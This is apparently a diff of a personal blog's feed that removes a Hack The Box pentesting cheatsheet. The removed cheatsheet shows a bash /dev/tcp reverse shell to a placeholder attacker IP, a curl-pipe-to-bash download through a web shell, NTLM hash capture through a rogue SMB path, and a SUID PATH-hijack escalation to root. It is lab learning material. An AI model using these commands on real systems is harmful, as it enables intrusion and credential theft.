-&lt;p&gt;This can be use to force the target make a call to a compromised host in the same network and captura the credentials challenge:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://unika.htb/index.php?page=\\10.1.2.3\blabla\
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;ntlm&quot;&gt;NTLM&lt;/h2&gt;
-
-&lt;p&gt;Windows New Technology LAN Manager (NTLM) is a suite of security protocols offered by Microsoft to authenticate users’ identity and protect the integrity and confidentiality of their activity. At its core, NTLM is a single sign on (SSO) tool that relies on a challenge-response protocol to confirm the user without requiring them to submit a password.&lt;/p&gt;
-
-&lt;p&gt;In order to mess with it, you might use the &lt;a href=&quot;https://github.com/lgandx/Responder&quot;&gt;responder tool&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;The idea to bypass the NTLM is to force the target authenticate against a rogue SMB server (provided by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;responder&lt;/code&gt; tool). This tool will capture the authentication challenge hash and then you can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt; tool to compare the hash with a dictionary to see if any entry matches.&lt;/p&gt;
-
-&lt;p&gt;For reference check: &lt;a href=&quot;/pentesting-tools/&quot;&gt;pentesting tools.&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;reverse-shell&quot;&gt;Reverse shell&lt;/h2&gt;
-
-&lt;p&gt;Reverse basically means that it is the target that will initiate a connection request back us (the attacker).&lt;/p&gt;
-
-&lt;p&gt;For example, once we have remote code execution in the target, we’ll be able to download and execute a piece of code.&lt;/p&gt;
-
-&lt;p&gt;Usually the process is:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;Create a file in the attacker machine containing a reverse shell payload:
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/&amp;lt;YOUR_IP_ADDRESS&amp;gt;/1337 0&amp;gt;&amp;amp;1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Create a server in the attacker machine which will act as the shell I/O. Normally this is done with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netcat&lt;/code&gt;.
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-nvlp&lt;/span&gt; 1337
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Start a webserver in the attacker machine that will server the reserve shell payload. You can do that with python (in the same directory as the payload):
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 8000
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Make the target machine download and execute the reverse shell payload:
-    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://thetoppers.htb/shell.php?cmd=curl%20%3CYOUR_IP_ADDRESS%3E:8000/shell.sh|bash
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;You can find a list of reverse shells here: &lt;a href=&quot;https://www.revshells.com/&quot;&gt;https://www.revshells.com/&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Once you have shell access, you can try to get a functional shell if python is installed:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;For reference check: &lt;a href=&quot;/pentesting-tools/&quot;&gt;pentesting tools.&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;server-side-template-injection&quot;&gt;Server side template injection&lt;/h2&gt;
-
-&lt;p&gt;If the target is using a templating engine, it is possible to use the template injection to execute commands in the server.&lt;/p&gt;
-
-&lt;p&gt;One easy way to test that is to put something like {{7*7}} in the template and check for the result.&lt;/p&gt;
-
-&lt;p&gt;If the template executes, we’ll see the result, out of luck we will see nothing. Or maybe we’ll see some trace that reveals the technology behind.&lt;/p&gt;
-
-&lt;h2 id=&quot;local-port-forwarding&quot;&gt;Local port forwarding&lt;/h2&gt;
-
-&lt;p&gt;Imagine you gain access to a machine which is running a service only for localhost. You can make that service available outside localhost by doing local port forwarding. e.g funnel.htb server is running postgres on port 5432.&lt;/p&gt;
-
-&lt;p&gt;With the next command, we’ll do a SSH tunnel between localhost:5432 and funnel.htb:5432 port&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 5432:localhost:5432 christine@funnel.htb
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;search-for-interesting-keywords-in-files&quot;&gt;Search for interesting keywords in files&lt;/h2&gt;
-
-&lt;p&gt;Let’s image someone decided to hardcode a username/password in one file in a web server. You can find it checking the files one by one or, you can use grep to search all files for interesting keywords:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Ril&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;passwd*&apos;&lt;/span&gt; /var/www/html
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;-R recursive
--i ignore case
--l show the file, not the match&lt;/p&gt;
-
-&lt;h3 id=&quot;search-for-users-in-the-machine&quot;&gt;Search for users in the machine&lt;/h3&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;list all the users in the machine&lt;/p&gt;
-
-&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege escalation&lt;/h2&gt;
-
-&lt;p&gt;Once you got user access to the target, you might need to get admin access.&lt;/p&gt;
-
-&lt;h3 id=&quot;windows&quot;&gt;Windows&lt;/h3&gt;
-
-&lt;p&gt;You can use &lt;a href=&quot;https://github.com/carlospolop/PEASS-ng&quot;&gt;https://github.com/carlospolop/PEASS-ng&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;You need to run the executable file in the target Windows machine. The script will identify the possible vulnerabilities to explot and gain admin access.&lt;/p&gt;
-
-&lt;p&gt;It might be possible that the password of the admin user has been pasted in the history of the shell. Check the output of winpeas for references to ` ConsoleHost_history.txt` file.&lt;/p&gt;
-
-&lt;h2 id=&quot;linux&quot;&gt;Linux&lt;/h2&gt;
-
-&lt;p&gt;First try to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Check the groups returned by id and search for binaries belonging to that group:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / -group bugtracker 2&amp;gt;/dev/null
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;If any check the permissions and what kind of file it is:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;robert@oopsie:/var/www/html$ ls -lisa /usr/bin/bugtracker &amp;amp;&amp;amp; file /usr/bin/bugtracker
-&amp;lt;isa /usr/bin/bugtracker &amp;amp;&amp;amp; file /usr/bin/bugtracker
-264151 12 -rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
-/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The flags show &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s&lt;/code&gt; and file shows &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setuid&lt;/code&gt;. That is a special permission named SUID or Set Owner User ID. SUID allows an alternate user to run an executable with the same permissions as the owner of the file instead of the permissions of the alternate user. That looks promising for privilede escalation.&lt;/p&gt;
-
-&lt;p&gt;In our case, the binary ‘bugtracker’ is owned by root &amp;amp; we can execute it as root since it has SUID set.&lt;/p&gt;
-
-&lt;p&gt;If we execute the app, we can see that is asking for input. On invalid input it shows an error showing that it’s using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;robert@oopsie:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bugtracker 12
-bugtracker 12
-
-&lt;span class=&quot;nt&quot;&gt;------------------&lt;/span&gt;
-: EV Bug Tracker :
-&lt;span class=&quot;nt&quot;&gt;------------------&lt;/span&gt;
-
-Provide Bug ID: 12
-12
-&lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;
-
-&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;: /root/reports/12: No such file or directory
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Looks like it’s not using the full path of the cat tool. We can create a executable named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; and put it before in PATH and it will execute that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; (/tmp/cat) instead of the real &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo &quot;/bin/sh&quot; &amp;gt; /tmp/cat
-robert@oopsie:/var/www/html$ export PATH=/tmp:$PATH
-robert@oopsie:/var/www/html$ echo $PATH
-/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
-robert@oopsie:/var/www/html$ bugtracker	
-bugtracker
-
-------------------
-: EV Bug Tracker :
-------------------
-
-Provide Bug ID: 12
-12
----------------
-
-# whoami
-whoami
-root
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><summary type="html">I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the pentesting techniques I am learning.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Password protection for Github Pages</title><link href="https://www.agalera.eu/github-pages-password/" rel="alternate" type="text/html" title="Password protection for Github Pages" /><published>2022-09-06T00:00:00+02:00</published><updated>2022-09-06T00:00:00+02:00</updated><id>https://www.agalera.eu/github-pages-password</id><content type="html" xml:base="https://www.agalera.eu/github-pages-password/">&lt;p&gt;In this article I implement a workaround to protect with password a static page stored in Github pages.&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="python" /><category term="cli" /><category term="click" /><category term="python" /><category term="cli" /><category term="click" /><summary type="html">I have been developing an Python application to be able to be run as a CLI tool. In this article I speak about how I implement that using click library.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/python-cli-app/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/python-cli-app/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Password protection for Github Pages</title><link href="https://www.agalera.eu/github-pages-password/" rel="alternate" type="text/html" title="Password protection for Github Pages" /><published>2022-09-06T00:00:00+02:00</published><updated>2022-09-06T00:00:00+02:00</updated><id>https://www.agalera.eu/github-pages-password</id><content type="html" xml:base="https://www.agalera.eu/github-pages-password/">&lt;p&gt;In this article I implement a workaround to protect with password a static page stored in Github pages.&lt;/p&gt;
 
 &lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;
 
